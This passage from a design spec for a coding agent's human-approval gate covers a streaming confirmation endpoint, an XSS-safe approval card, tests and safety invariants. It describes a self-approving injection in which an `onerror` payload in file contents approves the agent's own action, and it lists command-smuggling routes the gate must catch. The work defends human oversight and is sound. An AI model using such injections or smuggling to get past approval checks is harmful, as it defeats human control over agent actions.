    channel.run_id = uuid.uuid4().hex                         # carried in the decision payload
    _CHANNELS[conv_id] = channel
    remembered: set[str] = set()                              # FRESH per run (closes review1 finding H4)

    def _confirm(req: ConfirmRequest) -> bool:                # blocks the WORKER thread
        detail = None
        cap = REGISTRY.get(req.tool)
        if cap is not None and hasattr(cap, "preview") and not gate._jail_escapes(req.args, [project_dir]):
            try: detail = cap.preview(req.args, ctx)
            except Exception: detail = None                   # best-effort; never breaks
        approved, remember = channel.request_confirm(
            tool=req.tool, args=req.args, risk=req.risk.value,
            preview=req.preview, detail=detail, timeout=cfg.agent_confirm_timeout)
        if approved and remember and req.risk == RiskClass.MEDIUM:
            req.remember = True                               # gate re-checks REMEMBERABLE + signature
        return approved

    ctx = Context(allowed_dirs=[project_dir], conversation_id=conv_id,
                  confirm=_confirm, remembered=remembered)

    async def _drive():
        run = await asyncio.to_thread(
            agent_loop.run, cfg, REGISTRY, ctx, text,
            system_extra=agent_state.render(ws),
            on_event=channel.emit, paused_seconds=lambda: channel.waited,
            should_continue=lambda: not channel._closed,      # cancellation on disconnect
            max_seconds=cfg.agent_stream_max_seconds)
        channel.emit({"event": "done", "answer": run.answer, "steps": run.steps,
                      "stopped": run.stopped_reason, "working_state": ws.as_dict()})
        return run

    async def generate():
        drive = asyncio.create_task(_drive())
        try:
            async for evt in channel.events():
                yield _sse(evt)
        finally:
            channel.close()                                   # deny any dangling confirm (fail-closed)
            if _CHANNELS.get(conv_id) is channel:             # idempotent, channel-scoped (H5)
                _CHANNELS.pop(conv_id, None)
            with contextlib.suppress(Exception):
                run = await drive
                if run and run.answer:                        # persist + reflect/world, parity with /api/chat
                    db.add_message(conv_id, "assistant", run.answer)
                    _spawn(asyncio.to_thread(memory.reflect, cfg, text, run.answer))
                    _spawn(asyncio.to_thread(world_model.update, cfg, text, run.answer))
    return StreamingResponse(generate(), media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"})

@app.post("/api/agent/decision")
async def agent_decision(request: Request, payload: DecisionIn) -> dict:
    # same-origin guard (defense in depth — review2 medium): reject unless Origin/Sec-Fetch-Site matches host
    if not _same_origin(request):
        raise HTTPException(403, "cross-origin decision rejected")
    channel = _CHANNELS.get(payload.conversation_id)
    if channel is None or channel.run_id != payload.run_id:   # stale run ⇒ no-op (H5)
        return {"ok": False, "reason": "no active run"}
    return {"ok": channel.resolve(payload.confirm_id, payload.approve, payload.remember)}
```

`DecisionIn = {conversation_id: int, run_id: str, confirm_id: str, approve: bool, remember: bool = False}`. **`/api/agent` (confirm=None) is left byte-for-byte unchanged** — strangler-fig; it stays the offline/scriptable path.

### 4.7 The Approve/Deny card — XSS-safe (`app/static/*`)

**Gap closed — HIGH (review2 finding 3): the card renders attacker-controlled text (preview, args, diff, command, observation, jail-escape path) with no output encoding.** A file whose contents contain `<img src=x onerror=…>` would execute script in the same-origin approval UI, read the pending `confirm_id` from the DOM, and POST `{approve:true}` — a self-approving injection. The entire model rests on `confirm_id` being readable only same-origin; XSS breaks exactly that.

**Fix — every model/file-derived field is rendered as text, never HTML:** build the card with `document.createElement`; set `.textContent` for `preview`, `command`, `flagged`, the resolved jail-escape path, and observation; render `args` as `JSON.stringify(args)` into a `.textContent` node; render a diff by `pre.textContent = unified` (never `innerHTML`). Where a template string is unavoidable, wrap each interpolation in the existing `escapeHtml()` (app.js). **Do not** follow the `div.innerHTML = renderMarkdown(...)` idiom for these fields.

Card contents: colour-coded risk badge (medium=amber, high=orange, critical=red) + tool name; the gate one-liner `preview`; `detail` by kind (`command` → `<pre>` command line + `flagged` reason; `diff` → bounded red/green `<pre>`; jail-escape → prominent "OUTSIDE the project directory: <resolved path>"); **Approve** (primary) / **Deny** (secondary); a "Don't ask again this session for this exact target" checkbox rendered **only when `risk === "medium"`** (backend double-enforces). Handlers: `event:step`→tool chip; `event:observation`→bounded result; `event:confirm`→card + disable input ("Waiting for your approval…"); `event:confirm_timeout`→mark expired (denied); `event:done`→final answer + refresh working-state.

### 4.8 Config (PR3) — clamped, house style

Add a float-clamp (`_fclamp`) and two keys: `agent_confirm_timeout` (default 300.0, clamp `[5.0, 3600.0]`) — human-wait cap, expiry ⇒ deny; `agent_stream_max_seconds` (default 600.0, clamp `[10.0, 3600.0]`) — loop wall-clock excluding confirm-wait. **Gap closed — LOW (review1): the design called these "clamped" but the float path (`_num`) does not clamp**; a `0`/negative confirm timeout would make `Event.wait` return instantly and deny every MEDIUM+. Clamp them explicitly.

### 4.9 Done criteria (PR3)

`verify/verify_confirmation.py` (offline, scripted model, house exit-code contract, added to `verify_everything.py`) drives a scripted loop through a `RunChannel` on a `threading.Thread` and asserts:

- SAFE dispatch: no `confirm` event, loop never blocks.
- MEDIUM dispatch: exactly one `confirm` event; the worker thread is verifiably parked on `Event.wait` until a `resolve()` from another thread unblocks it (server-responsiveness analogue — `resolve` succeeds while the loop thread blocks).
- Approve → `cap.execute` runs, observation fed back, loop resumes to a final answer.
- Deny → loop observes `Result(False, "…denied by human")`, `execute` NOT called.
- Timeout → deny + `confirm_timeout` event; loop resumes.
- **Disconnect → `channel.close()` denies pendings AND `should_continue` halts the loop so no later remembered MEDIUM runs headless; the thread joins.**
- **Remember (signature): approve+remember `fs.write(A)`; a second `fs.write(B)` STILL raises a card** (name-key regression guard); a second `fs.write(A)` auto-approves with no card.
- Remember requested on HIGH/CRITICAL → ignored (still a card), asserted in both gate and endpoint.
- **Self-governing path:** `fs.write(config.yaml)` / anything under `app/security/` classifies HIGH and is never remembered.
- Jail-escape on a SAFE capability → the emitted event's risk is `"high"`; preview carries **no file contents**, only the resolved path.
- **XSS:** a confirm event carrying `<img src=x onerror=…>` in preview/detail/observation renders as inert text (no node with an `onerror` handler created).
- Strangler-fig regression: `POST /api/agent` (confirm=None) still auto-denies MEDIUM+; `verify_security.py`, `verify_capabilities.py`, `verify_agent.py`, `verify_fs_read.py` all stay green.
- End-to-end on the PC (once `fs.write` ships): a real MEDIUM action surfaces a card with a bounded diff; Approve writes + resumes; Deny leaves the tree untouched and the model acknowledges the denial; the remember checkbox suppresses the next identical-target MEDIUM card within the session only.

---

## 5. Non-negotiable safety invariants (checklist)

Every PR must preserve all of these. A violation is a blocker, not a nit.

- [ ] **Zero unconfirmed MEDIUM+.** No path — SAFE de-escalation, allowlist, newline/`&`/`<(` smuggling, interpreter/encoded laundering, remember, disconnect drain — runs a MEDIUM/HIGH/CRITICAL action without an explicit human approval for *that* action. `terminal.run` has no SAFE branch.
- [ ] **Project jail on the resolved path.** Jail checks compare `.resolve()`d locations. `fs.*` targets are gate-jailed via `_PATH_KEYS`. `terminal.run` is **cwd-jailed, not path-jailed** — stated honestly; any absolute-path/`..`/`~`/redirect command is escalated to HIGH so the human sees it before it runs; the resting cwd is snapped back using an **OS-authoritative** read (never `$PWD`).
- [ ] **Self-governing paths are HIGH.** Writes/commands touching `config*.yaml`, `app/security/**`, `.git/hooks/**`, or credential/dotfiles escalate to HIGH (never rememberable) even inside the jail.
- [ ] **No unattended loop.** One command per dispatch; no auto-retry / fix-the-build; `terminal.run` never rememberable; loop honors `should_continue` and absolute + think-time budgets.
- [ ] **Fail-closed on client disconnect.** `channel.close()` denies all pending confirmations and `should_continue` halts the loop before the next dispatch; no worker thread is left parked; no remembered action runs headless.
- [ ] **Remember never for HIGH/CRITICAL.** `REMEMBERABLE = {MEDIUM}`, enforced in gate consult + gate add + endpoint; keyed on a **signature (resolved path / opt-out)**, MEDIUM-only, **scoped to a single run**, in-memory (dies on restart / new conversation), never persisted.
- [ ] **The gate stays the single choke point.** The decision to ask a human never leaves `gate.authorize`, reached only via `registry.dispatch`. Streaming supplies the *channel*, never the *policy*. New caps add zero new privilege. `preview` is pure/side-effect-free/jail-confined and never executes.
- [ ] **The non-streaming path keeps working.** `/api/agent` (confirm=None) unchanged; `loop.run`'s new params are keyword-only and optional; the gate change is additive (`str(req)` preserves string callers). All existing verify scripts stay green.
- [ ] **UI renders untrusted content as text.** No `innerHTML` for any model/file-derived field; same-origin guard on `/api/agent/decision`; `confirm_id` never persisted to history/steps.
- [ ] **Everything bounds output and never raises out of `execute`/`dispatch`/`loop.run`.**

---

## 6. How to work

- **House style, always.** `from __future__ import annotations`; best-effort `try/except  # noqa: BLE001 - contained; the loop observes it` that never breaks chat; SAFE caps carry **no** local METRICS (registry counts them) — `terminal` is the one METRICS exception because it owns backend state. Match `git_status.py`/`fs_read.py` line for line where you can. Self-contained per file (duplicate `_git()` rather than extract).
- **Every capability ships tests + a `verify_*.py`** on the exit-0-pass / 2-skip / other-fail contract: `sys.path.insert(0, repo_root)`, `check(name, ok)` printing `OK`/`XX`, a `FAILS` list, `main() -> int`, `sys.exit(main())`. Fully offline (temp dir / scripted model / `git init` throwaway); use exit **2** to skip when a dep (`git`, `pywinpty`) is absent. `verify_everything.py` auto-discovers by glob — no runner edit.
- **Verify on the 4070.** After each PR: `\.venv\Scripts\python verify\verify_everything.py` (Windows) — the whole suite must be green (skips are fine, fails are not) before the next PR. The PTY path only truly exercises on the PC; the Linux/degrade path must also pass. The local PC is the source of truth (Constitution §3).
- **Strangler-fig.** Add beside the working system; switch on only after it verifies on the PC. `/api/agent` and every existing endpoint keep working through all four PRs. Delete nothing that works until its replacement is proven.
- **Incremental, one coherent PR at a time.** Do not start PR4 (terminal) until PR3 (confirmation UX) is merged and verified on the PC — the hard rule.

### Explicit human-decision points — STOP and ask Toni before finalizing

You must not decide these yourself; get an explicit answer first:

1. **Terminal process model.** (a) The zero-SAFE-allowlist posture (§3.1) vs a tiny hardened read-only allowlist — recommend zero-allowlist. (b) POSIX persistence in dev/CI: use the stdlib `pty` for a real persistent shell on Linux (parity with Windows ConPTY, lets `verify_terminal` exercise persistence on CI) vs keep Linux on the one-shot degrade and reserve persistence for the PC. (c) Session lifetime / reaper: close+respawn on `/api/new` and/or an idle TTL, and where the reap hook lives (main.py shutdown vs a background reaper). (d) PTY reports stdout+stderr **combined** (inherent to ConPTY); only the degrade path separates stderr — acceptable, or is a stderr-separated persistent path required?
2. **SSE vs WebSocket transport** for the confirmation stream (§4.1). Recommend SSE (reuses `/api/chat`'s `StreamingResponse`, single debuggable HTTP stack, no second protocol). Confirm before building the endpoints.

Secondary confirmations to fold into the relevant PR (not blocking, but surface them): confirm-timeout value/policy (default 300s, expiry ⇒ deny); remember lifetime (recommend per-run in-memory, not DB-backed); `fs.write` diff bounding (recommend bounded, not full unified); whether `git.log` should ever offer all-branches/path-scoped history (Phase 1 = current-branch recent only).